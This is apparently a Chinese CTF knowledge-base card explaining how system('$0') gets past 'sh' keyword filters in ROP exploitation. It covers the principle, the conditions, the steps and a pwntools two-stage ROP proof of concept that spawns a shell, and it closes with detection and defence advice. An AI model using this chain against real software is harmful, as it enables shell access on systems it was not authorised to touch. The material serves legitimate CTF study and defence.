---
id: binary-pwn-rop-system-dollar0-bypass-sh-filter
title: system("$0") 绕过 sh 关键字过滤：借 argv[0] 拉起 shell
type: scenario
domain: binary
path: binary/pwn/rop
technique: system-dollar0-argv0-shell-bypass
tags:
- binary
- pwn
- rop
- system
- shell
- filter-bypass
- argv0
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:22:53+08:00'
  notes: 已对照原文 ROP2 题核对：过滤 sh 时用代码段/可写地址中的 $0（字节 24 30）传给 system，原文图无；PoC 为通用两阶段写法，未在本机复跑目标二进制。
url: /docs/binary/pwn/rop/binary-pwn-rop-system-dollar0-bypass-sh-filter/
draft: false
kb_aliases:
- system($0)
- $0 绕过 sh 过滤
- argv0 拉起 shell
- ROP2 $0
- 过滤 sh 的 system 绕过
- 24 30 00 shell
---

## 一句话结论

当 ROP 已经能调用 `system`、但题目过滤了 `sh`/`/bin/sh`/`bash` 等字符串时，可以把参数换成 `$0`：`system("$0")` 实际执行 `/bin/sh -c '$0'`，shell 会把 `$0` 展开为自身的调用名（通常是 `sh` 或 `/bin/sh`）并再次执行，从而在不出现 `sh` 字面量的情况下拿到 shell。

## 原理

- `system(cmd)` 的语义是 `/bin/sh -c cmd`。当 `cmd` 为 `$0` 时，shell 在执行前做参数展开：`$0` 是当前 shell 的名字（由调用者的 `argv[0]` 决定，通常为 `sh` 或 `/bin/sh`）。
- 于是 `/bin/sh -c '$0'` 等价于执行 `sh`/`/bin/sh`，启动一个新的交互式 shell；整个过程不需要输入字符串中出现 `sh`。
- 过滤通常只匹配请求/输入中的连续 `sh`、`/bin/sh`、`bash` 子串；`$0` 的字节是 `24 30`，不含这些子串，因此绕过。
- 在 ROP 中只需要：一个可写地址（写 `"$0\0"`）、`pop rdi; ret`、`system` 地址。若二进制有 `read` 或 `gets`，可用两阶段：第一阶段把 `"$0\0"` 写到 BSS，第二阶段 `system(bss)`。
- 该技巧依赖 `/bin/sh` 存在且 `system` 可用；如果目标使用 `execve` 直接传参或 shell 被替换为不支持 `$0` 展开的程序，则不成立。

## 触发条件

- 存在栈溢出/任意写，能控制 ROP 链并调用 `system`（PLT 或 libc）。
- 输入过滤/黑名单拦截 `sh`、`/bin/sh`、`bash` 等字符串，但不拦截 `$0`。
- 有可写内存（BSS/heap/stack）存放 `"$0\0"`，且知道其地址（无 PIE 或已泄漏）。
- 目标环境 `/bin/sh` 可用，`system` 未禁用。

## 利用步骤

1. 找 gadget：`pop rdi; ret`、`system@plt` 或 libc `system`；确定 BSS/可写地址。
2. 第一阶段：用 `read`/`gets` 把 `b"$0\x00"` 写到 BSS，然后返回到第二阶段 ROP（或直接在同一链中调用 `read`）。
3. 第二阶段：`pop rdi; ret` -> `bss` -> `system`。
4. 触发后应得到 shell；若只看到命令输出后退出，检查 `$0` 字符串是否被截断、地址是否正确、栈对齐是否满足 `system` 的 16 字节对齐要求。

## PoC

```python
from pwn import *

elf = ELF("./chall")
io = process("./chall")
pop_rdi = 0x40119e
pop_rsi = 0x4011a0      # 按目标二进制替换
pop_rdx = 0x4011a2      # 按目标二进制替换
read_plt = elf.plt["read"]
system = elf.plt["system"]
bss = 0x404a00

# 第一阶段：read(0, bss, 8) 写入 "$0\0"，然后 system(bss)
payload = b"A" * 0x30
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx) + p64(8)
payload += p64(read_plt)
payload += p64(pop_rdi) + p64(bss)
payload += p64(system)
io.send(payload)
io.send(b"$0\x00")
io.interactive()
```

## 变体与关联

- 变体：`$0` 可写成 `${0}`、`$SHELL`（若环境变量可控）等；不同 shell 的展开行为略有差异。
- 变体：若 `system` 参数只能传一个固定字符串，可把 `"$0"` 预先写入只读段/环境变量，再传其地址。
- 变体：过滤 `$` 时可改用 `$@`、`$*` 或 `printf` 构造 `sh`，但可靠性不如 `$0`。
- 关联卡片：[[binary-pwn-rop-static-link-ret2system-sh]]、[[binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch]]、[[binary-pwn-stack-ret2syscall-32bit]]。

## 检测与防御

- 检测：ROP/输入中出现 `$0`、`${0}`、`$SHELL` 等参数；`system` 调用参数不是固定命令而是 shell 变量。
- 防御：不要把用户输入直接传给 `system`；使用 `execve` + 固定参数数组，或白名单命令。
- 防御：过滤 `$`、反引号、命令替换；禁用不必要的 `system`/`popen`。
- 防御：编译时开启 Full RELRO/PIE/Canary/NX，减少 ROP 可用 gadget。
